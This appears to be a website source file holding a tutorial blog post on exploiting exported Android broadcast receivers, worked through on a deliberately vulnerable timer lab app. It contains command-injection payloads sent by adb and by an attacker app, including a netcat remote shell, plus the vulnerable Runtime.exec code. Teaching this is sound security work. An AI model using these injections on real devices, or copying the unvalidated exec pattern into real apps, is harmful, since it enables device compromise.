import BlogPost from '@/components/custom/blog';
import Footer from '@/components/custom/footer';
import NavMenu from '@/components/custom/nav-menu';

function AndroidSecurityExportedBroadcastReciever() {
  const frontmatter = {
    title: 'Android Security::Exported Broadcast Receiver',
    date: '2024-03-31',
    tags: ['Android Security', 'Broadcast Receiver'],
    authors: ['Ajin Deepak'],
  };

  const content = `
Hey all, Its been a very long time since i did android security stuff. So recently i got some chance to do this again so i wanted to write a quick blog on exported broadcast receivers. So without too much bs let's start.

### Broadcast Receiver

So what is a broadcast receiver? Let me ask a different question what is a broadcast ?

If you've used any messaging apps, you pretty much have the idea. A broadcast is a way to send a message to a group of people. Imagine you're at a party and you have something to say. If you have enough brain cells, you shout out your message for everyone to hear instead of telling everyone individually. That's exactly what a broadcast is about.

When it comes to Android, a broadcast is used to send a message from one app to a group of other apps at the same time. This has plenty of use cases. For example, when your phone receives an incoming call, the OS broadcasts an intent to notify all the apps that a call has occurred. This helps Caller ID apps like Truecaller display the caller ID at that time. Similarly, when the battery is low, Android sends out a broadcast so that the app can function accordingly.

See there are mainly two types of broadcasts:

1. System Broadcasts : Android OS itself provides some broadcasts. You can check that [here](eveloper.android.com/about/versions/11/reference/broadcast-intents-30)
2. App defined Broadcasts : We can define our own broadcasts in the app itself.

Alright now check the question again. 

#### So what is a broadcast receiver?

A broadcast receiver basically catches the broadcast and decides if it's something that a particular app is interested in. For example, let's reconsider the low battery example above. When the battery percentage becomes very low, the Android system will send a system-wide broadcast. Imagine you have a battery saver app; this app will have a broadcast receiver that will receive this broadcast and do something in response. One peculiar use case I want to mention is the use of the 'android.intent.action.REBOOT' broadcast in malware for persistence.

Now to get some more technical idea about this stuff i highly recommend you to create a small app implementing the broadcast receiver. Try going through the links below.

- https://www.youtube.com/watch?v=lldf3nei2rQ
- https://www.geeksforgeeks.org/broadcast-receiver-in-android-with-example/
- https://www.youtube.com/watch?v=rowqGmHcBJc

### Exported Broadcast Receiver

So what is an exported broadcast receiver?

The "exported" attribute of a broadcast receiver allows components from outside its app to send it messages. If a broadcast receiver is "exported," it means it's available to other apps, meaning that these apps can also receive and send broadcasts. This can be useful for various purposes, such as listening for system-wide events (like battery level changes or connectivity changes) or managing communication between different apps. However, the risk arises when using broadcasts to send sensitive data; if it's exported, other apps can receive this broadcast and that sensitive data. A prime example can be seen in the report below.

https://hackerone.com/reports/167481

Next question will be how to export or how to find exported broadcast receivers?

~~~xml
<receiver android:name=".MyBroadcastReceiver"
          android:exported="true">
    <intent-filter>
        <!-- filters for specific actions -->
        <action android:name="com.example.broadcast.MY_NOTIFICATION" />
    </intent-filter>
</receiver>
~~~

This is a part of the manifest file which defines a broadcast receiver. In this snippet we can see the attribute *exported* is set to true. If that's the case then we can say that the broadcast receiver is exported.

1. **\`<receiver>\`**: Declares a broadcast receiver component in the app.
   - **\`android:name=".MyBroadcastReceiver"\`**: Specifies the class name of the receiver, relative to the package of the application.
   - **\`android:exported="true"\`**: Indicates that the receiver can accept messages (intents) from sources outside its app, including other apps and the system.
2. **\`<intent-filter>\`**: Defines the types of intents the receiver is interested in.
   - **\`<action android:name="com.example.broadcast.MY_NOTIFICATION" />\`**: Specifies an intent action name. The receiver will respond to intents with this action.

The action is like name or description. We can set our broadcast to respond only to a particular action. Let's consider this analogy here. In an airport, announcements are made to communicate messages to passengers. But not all announcements are relevant to every passenger. For example, there might be a boarding call for a flight to Delhi, a lost item announcement, or like a reminder to keep personal belongings secure.

- **The airport represents the Android system**, which is a hub of activities (intents) happening.
- **Each type of announcement (boarding calls, lost item notifications, security reminders) represents a different "action"** in the intent-filter context. Just as announcements are directed to passengers based on their relevance (flight destination, ownership of lost items), intents in android are directed to components that have declared an interest in handling them through specific actions.
- **Passengers listening for their boarding call represent \`BroadcastReceivers\` listening for intents with specific actions**. Just as a passenger for the flight to New York pays attention to the boarding call for that specific flight, a BroadcastReceiver configured with an intent-filter for \`com.example.broadcast.MY_NOTIFICATION\` listens for intents that match this action.

### Lab Time

Let's do a small handson exercise to exploit a broadcast receiver.

Consider the below app. Link for this [app](https://github.com/DERE-ad2001/android-sec/tree/main/Timer2)

![](/images/posts/android-security-exported-broadcast-reciever/1.webp)

This is a timer app let's try it out.

![](/images/posts/android-security-exported-broadcast-reciever/2.webp)

I'm trying setup a timer for 1 minute. It shows two options 

1. Timer
2. Priority Timer

Let's see what the priority timer does.

![](/images/posts/android-security-exported-broadcast-reciever/3.webp)

Oops its disabled. Let's try the normal one.

![](/images/posts/android-security-exported-broadcast-reciever/4.webp)

It just toasts the message "Timer completed", after the countdown completes.I specified 0 minute here. 

Alright now let's examine the code to see if we find anything interesting. For this time, i will showing you the real source code. But try to use jadx and figure out the code by yourself.

Let's first take a look at the manifest file.

![](/images/posts/android-security-exported-broadcast-reciever/5.webp)

We can see a broadcast receiver called "CountdownReceiver" and it's exported. We also have two actions for this CountdownReceiver.

- COUNTDOWN_COMPLETE
- PRIORITY_ACTION

Now let's check the code for CountdownReceiver.

~~~kotlin
class CountdownReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        intent?.let {
            val action = it.action
            when (action) {
                "COUNTDOWN_COMPLETE" -> handleCountdownComplete(context, it)
                "PRIORITY_ACTION" -> priortyHandler(context, it)
            }
        }
    }

    private fun handleCountdownComplete(context: Context?, intent: Intent) {
        var startTime = intent.getStringExtra("getTime")
        Toast.makeText(context, "Timer completed $startTime ", Toast.LENGTH_SHORT).show()
    }

       private fun priortyHandler(context: Context?, intent: Intent) {
        val startTime = intent.getStringExtra("getTime")
        val key = intent.getStringExtra("key")
        if(key == "priority"){
            Runtime.getRuntime().exec(arrayOf("/system/bin/sh","-c","log Timer Started:$startTime"))
            Toast.makeText(context, "Priority Timer Completed ", Toast.LENGTH_SHORT).show()
        }
    }
}
~~~

When examining the code for the broadcast receiver, first go through the \`onReceive\` method. The \`onReceive\` method is the callback method that is executed when it receives a broadcast. It basically handles the broadcast. Here, it checks the action received.If it is \`COUNTDOWN_COMPLETE\`, it will invoke the \`handleCountdownComplete\` method. If it is \`PRIORITY_ACTION\`, it will invoke the \`priorityHandler\` method. But when we ran the app it said that priority timer was disabled yet we can see the action defined here and also a method for handling that. Let's also take a look at the MainActivity to see what's happening.

~~~kotlin
class MainActivity : AppCompatActivity() {
    private lateinit var minutesEditText: EditText
    private lateinit var startButton: Button
    private lateinit var timeView: TextView
    private var timer: CountDownTimer? = null
    private var alertDialog: AlertDialog? = null
    private lateinit var receiver: CountdownReceiver

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        minutesEditText = findViewById(R.id.minutesEditText)
        startButton = findViewById(R.id.startButton)
        timeView = findViewById(R.id.timeView)
        receiver = CountdownReceiver()
        registerReceiver(receiver, IntentFilter("COUNTDOWN_COMPLETE"))
        registerReceiver(receiver, IntentFilter("PRIORITY_ACTION"))
      
        startButton.setOnClickListener {
            showStartDialog()
        }
    }

    private fun showStartDialog() {
        val alertDialogBuilder = AlertDialog.Builder(this)
        alertDialogBuilder.setTitle("Start Timer")
        alertDialogBuilder.setMessage("Choose the type of timer:")

        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.HORIZONTAL

        val timerButton = Button(this)
        timerButton.text = "Timer"
        timerButton.setOnClickListener {
            val inputMinutes = minutesEditText.text.toString().toLongOrNull() ?: 0
            val durationInMillis = inputMinutes * 60 * 1000L
            startTimer(durationInMillis, inputMinutes)
            alertDialog?.dismiss()
        }

        val priorityTimerButton = Button(this)
        priorityTimerButton.text = "Priority Timer"
        priorityTimerButton.setOnClickListener {
            showDisabledFeatureToast()
            alertDialog?.dismiss()
        }

        layout.addView(timerButton)
        layout.addView(priorityTimerButton)
        alertDialogBuilder.setView(layout)
        alertDialog = alertDialogBuilder.create()
        alertDialog?.show()
    }

    private fun startTimer(duration: Long, inputMinutes: Long) {
        timer?.cancel()
        timer = object : CountDownTimer(duration, 1000) {
            override fun onTick(millisUntilFinished: Long) {
                timeView.text = formatTime(millisUntilFinished)
            }

            override fun onFinish() {
                timeView.text = "00:00"
                Finished(inputMinutes)
            }
        }.start()
    }

    private fun Finished(inputMinutes: Long) {
        Intent("COUNTDOWN_COMPLETE").also { intent ->
            intent.putExtra("getTime", inputMinutes.toString())
            sendBroadcast(intent)
        }
    }

    private fun formatTime(millis: Long): String {
        val seconds = millis / 1000
        val minutes = seconds / 60
        val remainingSeconds = seconds % 60
        return String.format("%02d:%02d", minutes, remainingSeconds)
    }

    private fun showDisabledFeatureToast() {
   Toast.makeText(this, "This feature has been disabled due to security implications", Toast.LENGTH_SHORT).show()
    }
}
~~~

We can see a basic implementation of a Timer. When the countdown finishes it will send a broadcast using the \`sendBroadcast\` method  with the action \`COUNTDOWN_COMPLETE\`.

~~~kotlin
Intent("COUNTDOWN_COMPLETE").also { intent ->
                  intent.putExtra("getTime", inputMinutes.toString())
                  LocalBroadcastManager.getInstance(applicationContext).sendBroadcast(intent)
              }
~~~

Additionally, we can see that an extra value is passed with the broadcast using \`putExtra\`. \`putExtra\` can be used to send key-value pairs. In this case, we are sending the minute entered in the EditText. When the receiver receives this, it will invoke the \`handleCountdownComplete\` method. This method retrieves the minute we entered through \`intent.getStringExtra("getTime")\`. The key name is \`getTime\`, and it will display a toast containing that value.

~~~kotlin
private fun handleCountdownComplete(context: Context?, intent: Intent) {
    var startTime = intent.getStringExtra("getTime")
    Toast.makeText(context, "Timer completed $startTime ", Toast.LENGTH_SHORT).show()
}
~~~

Alright, everything looks good, so what's the problem? The problem is that this is exported, so other apps can send the broadcast, and the receiver will receive it without any hesitation. Let's first check if other apps can do it. 

I will create a new project in android studio for this.

Below is the source code for the app.

~~~kotlin
package com.android.broadcastsend

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import androidx.localbroadcastmanager.content.LocalBroadcastManager

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Intent("COUNTDOWN_COMPLETE").also { intent ->
            intent.putExtra("getTime", "0")
            sendBroadcast(intent)
        }
    }
}
~~~

This will send a broadcast with the action "COUNTDOWN_COMPLETE" and i'm also passing the "getTime" with "0". Let's lauch the app and see if it works.

![](/images/posts/android-security-exported-broadcast-reciever/6.webp)

Woah it worked.

We also test this out using adb.

~~~bash
adb shell am broadcast -a COUNTDOWN_COMPLETE --es getTime "0"
~~~

- \`adb shell\`: Access device command line.
- \`am\`: Activity Manager
- \`broadcast\`: Send a broadcast message.
- \`-a COUNTDOWN_COMPLETE\`: Set action to \`COUNTDOWN_COMPLETE\`.
- \`--es\`: Add extra string data.
- \`getTime "0"\`: Key \`getTime\` with value \`"0"\`.

Okay now we know how to send these broadcasts.

Now let's see what the actual vulnerability in this thing is. We already know the broadcast receiver has been exported, so we have to send broadcasts to this app. But a small timer app can't cause much damage, right? Let's take a look at the disabled priority timer. Even though the app says it's disabled, the action and function for that are still defined in the broadcast receiver.

~~~kotlin
private fun priortyHandler(context: Context?, intent: Intent) {
    val startTime = intent.getStringExtra("getTime")
    val key = intent.getStringExtra("key")
    if(key == "priority"){
        Runtime.getRuntime().exec(arrayOf("/system/bin/sh","-c","log Timer Started:$startTime"))
        Toast.makeText(context, "Priority Timer Completed ", Toast.LENGTH_SHORT).show()
    }
}
~~~

If the action for the broadcast is \`PRIORITY_ACTION\`, then the \`priorityHandler\` function will be invoked. This function not only takes the extra "getTime" but also takes another extra called "key". If the value of "key" is "priority", it will log the time with the message "Log Timer Started: $startTime" using the \`exec\` command. 

Let's try if we can invoke the priortyHandler using adb. 

~~~bash
ajindeepak@Ajins-MBP ~ % adb shell am broadcast -a PRIORITY_ACTION --es getTime "0" --es key "priority"
Broadcasting: Intent { act=PRIORITY_ACTION flg=0x400000 (has extras) }
Broadcast completed: result=0
~~~

![](/images/posts/android-security-exported-broadcast-reciever/7.webp)

It works! Now, if you examine the \`exec\` command, you can identify a vulnerability. It simply takes the value from the variable \`startTime\`, passed from the extra \`getTime\`, without any validation. This could lead to \`command injection\`. I can use \`;\` to insert a new command.

~~~kotlin
Runtime.getRuntime().exec(arrayOf("/system/bin/sh","-c","log Timer Started:$startTime"))
~~~

So let's try to inject a simple command to see if it's vulnerable using adb. I will try to create a file in the \`/data/local/tmp\` directory using the touch command.

~~~bash
adb shell am broadcast -a PRIORITY_ACTION --es getTime "0;touch /data/data/com.android.timer/files/nji.txt" --es key "priority"
~~~

![](/images/posts/android-security-exported-broadcast-reciever/8.webp)

Woah!! The file \`nji.txt\` got created. Now let's create an app to do this.

~~~kotlin
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Intent("PRIORITY_ACTION").also { intent ->
            intent.putExtra("getTime", "0;touch /data/data/com.android.timer/files/nji.txt")
            intent.putExtra("key","priority")
            sendBroadcast(intent)
        }
    }
}
~~~

We have successfully achieved code execution through a exported broadcast receiver. Let's try if we can get a shell.

~~~kotlin
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Intent("PRIORITY_ACTION").also { intent ->
            intent.putExtra("getTime", "0 && nc -p 1234 -L /system/bin/sh -l")
            intent.putExtra("key","priority")
            sendBroadcast(intent)
        }
    }
}
~~~

Let's run this app and see if this works.

![](/images/posts/android-security-exported-broadcast-reciever/9.webp)

Now let's try using nc in our host.

![](/images/posts/android-security-exported-broadcast-reciever/10.webp)

Woah we got the reverse shell. I know this scenario seems highly unrealistic but just wanted to showcase how we can identify exported broadcasts and how to invoke them.
`;
  return (
    <div className='min-h-screen flex flex-col px-[5%] pt-2 lg:px-[10%] lg:pt-5'>
      <div className='flex-grow'>
        <NavMenu />
        <BlogPost frontmatter={frontmatter} content={content} />
      </div>
      <Footer />
    </div>
  );
}

export default AndroidSecurityExportedBroadcastReciever;
